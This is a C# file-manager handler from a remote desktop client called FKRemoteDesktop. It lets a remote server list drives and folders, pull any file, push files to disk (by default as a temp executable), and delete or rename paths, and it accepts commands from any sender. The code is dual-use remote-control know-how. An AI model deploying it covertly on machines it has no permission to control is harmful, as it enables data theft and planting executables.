using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.DllHook;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Extensions;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Utilities;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Security;
using System.Threading;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class FileManagerHandler : NotificationMessageProcessor, IDisposable
    {
        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);
        private readonly FKClient _client;
        private CancellationTokenSource _tokenSource;
        private CancellationToken _token;

        public FileManagerHandler(FKClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        private void OnClientStateChange(Client s, bool connected)
        {
            switch (connected)
            {
                case true:
                    _tokenSource?.Dispose();
                    _tokenSource = new CancellationTokenSource();
                    _token = _tokenSource.Token;
                    break;

                case false:
                    _tokenSource.Cancel();
                    break;
            }
        }

        public override bool CanExecute(IMessage message) => message is GetDrives ||
                                                     message is GetDirectory ||
                                                     message is FileTransferRequest ||
                                                     message is FileTransferCancel ||
                                                     message is FileTransferChunk ||
                                                     message is DoPathDelete ||
                                                     message is DoPathRename;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDrives msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: GetDrives");
                    Execute(sender, msg);
                    break;

                case GetDirectory msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: GetDirectory");
                    Execute(sender, msg);
                    break;

                case FileTransferRequest msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: FileTransferRequest");
                    Execute(sender, msg);
                    break;

                case FileTransferCancel msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: FileTransferCancel");
                    Execute(sender, msg);
                    break;

                case FileTransferChunk msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: FileTransferChunk");
                    Execute(sender, msg);
                    break;

                case DoPathDelete msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoPathDelete");
                    Execute(sender, msg);
                    break;

                case DoPathRename msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoPathRename");
                    Execute(sender, msg);
                    break;
            }
        }

        // 获取驱动信息
        private void Execute(ISender client, GetDrives command)
        {
            DriveInfo[] driveInfos;
            try
            {
                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives I/O 错误", SetLastDirectorySeen = false });
                return;
            }
            catch (UnauthorizedAccessException)
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives 缺失权限", SetLastDirectorySeen = false });
                return;
            }

            if (driveInfos.Length == 0)
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives 没有驱动信信息", SetLastDirectorySeen = false });
                return;
            }

            Drive[] drives = new Drive[driveInfos.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                try
                {
                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].VolumeLabel,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat)
                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);
                    drives[i] = new Drive
                    { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                }
                catch (Exception) { }
            }
            client.Send(new GetDrivesResponse { Drives = drives });
        }

        // 获取文件夹信息
        private void Execute(ISender client, GetDirectory message)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(message.RemotePath);
                FileInfo[] files = dicInfo.GetFiles();
                DirectoryInfo[] directories = dicInfo.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];
                int offset = 0;
                for (int i = 0; i < directories.Length; i++, offset++)
                {
                    items[i] = new FileSystemEntry
                    {
                        EntryType = EFileType.eFileType_Directory,
                        Name = directories[i].Name,
                        Size = 0,
                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
                    };
                }

                for (int i = 0; i < files.Length; i++)
                {
                    items[i + offset] = new FileSystemEntry
                    {
                        EntryType = EFileType.eFileType_File,
                        Name = files[i].Name,
                        Size = files[i].Length,
                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
                    };
                }

                client.Send(new GetDirectoryResponse { RemotePath = message.RemotePath, Items = items });
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory 缺失权限");
            }
            catch (SecurityException)
            {
                onError("GetDirectory 缺失权限");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory 路径过长");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory 未找到文件夹");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory 未找到文件");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O 错误");
            }
            catch (Exception)
            {
                onError("GetDirectory 异常失败");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = true });
            }
        }

        // 文件传输消息
        private void Execute(ISender client, FileTransferRequest message)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                    {
                        _activeTransfers[message.Id] = srcFile;
                        OnReport("文件开始上传");
                        foreach (var chunk in srcFile)
                        {
                            if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
                                break;

                            _client.SendBlocking(new FileTransferChunk
                            {
                                Id = message.Id,
                                FilePath = message.RemotePath,
                                FileSize = srcFile.FileSize,
                                Chunk = chunk
                            });
                        }

                        client.Send(new FileTransferComplete
                        {
                            Id = message.Id,
                            FilePath = message.RemotePath
                        });
                    }
                }
                catch (Exception)
                {
                    client.Send(new FileTransferCancel
                    {
                        Id = message.Id,
                        Reason = "读取文件出错"
                    });
                }
                finally
                {
                    RemoveFileTransfer(message.Id);
                    _limitThreads.Release();
                }
            }).Start();
        }

        // 文件传输中止
        private void Execute(ISender client, FileTransferCancel message)
        {
            if (_activeTransfers.ContainsKey(message.Id))
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "用户取消"
                });
            }
        }

        // 接收服务器文件块
        private void Execute(ISender client, FileTransferChunk message)
        {
            try
            {
                if (message.Chunk.Offset == 0)
                {
                    string filePath = message.FilePath;
                    if (string.IsNullOrEmpty(filePath))
                    {
                        filePath = FileHelper.GetTempFilePath(".exe");
                    }
                    if (File.Exists(filePath))
                    {
                        NativeMethods.DeleteFile(filePath);
                    }
                    _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
                    OnReport("文件开始下载");
                }

                if (!_activeTransfers.ContainsKey(message.Id))
                    return;

                var destFile = _activeTransfers[message.Id];
                destFile.WriteChunk(message.Chunk);
                if (destFile.FileSize == message.FileSize)
                {
                    client.Send(new FileTransferComplete
                    {
                        Id = message.Id,
                        FilePath = destFile.FilePath
                    });
                    RemoveFileTransfer(message.Id);
                }
            }
            catch (Exception)
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "写入文件出错"
                });
            }
        }

        // 删除文件或文件夹消息
        private void Execute(ISender client, DoPathDelete message)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (message.PathType)
                {
                    case EFileType.eFileType_Directory:
                        Directory.Delete(message.Path, true);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "删除文件夹",
                            SetLastDirectorySeen = false
                        });
                        break;

                    case EFileType.eFileType_File:
                        File.Delete(message.Path);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "删除文件",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.Path) });
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath 缺失权限");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath 路径过长");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath 路径不存在");
            }
            catch (IOException)
            {
                onError("DeletePath I/O 错误");
            }
            catch (Exception)
            {
                onError("DeletePath 异常失败");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        // 重命名文件或文件夹
        private void Execute(ISender client, DoPathRename message)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (message.PathType)
                {
                    case EFileType.eFileType_Directory:
                        Directory.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "重命名文件夹",
                            SetLastDirectorySeen = false
                        });
                        break;

                    case EFileType.eFileType_File:
                        File.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "重命名文件",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.NewPath) });
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath 缺失权限");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath 路径过长");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath 路径不存在");
            }
            catch (IOException)
            {
                onError("RenamePath I/O 错误");
            }
            catch (Exception)
            {
                onError("RenamePath 异常失败");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        private void RemoveFileTransfer(int id)
        {
            if (_activeTransfers.ContainsKey(id))
            {
                _activeTransfers[id]?.Dispose();
                _activeTransfers.TryRemove(id, out _);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _tokenSource.Cancel();
                _tokenSource.Dispose();
                foreach (var transfer in _activeTransfers)
                {
                    transfer.Value?.Dispose();
                }
                _activeTransfers.Clear();
            }
        }
    }
}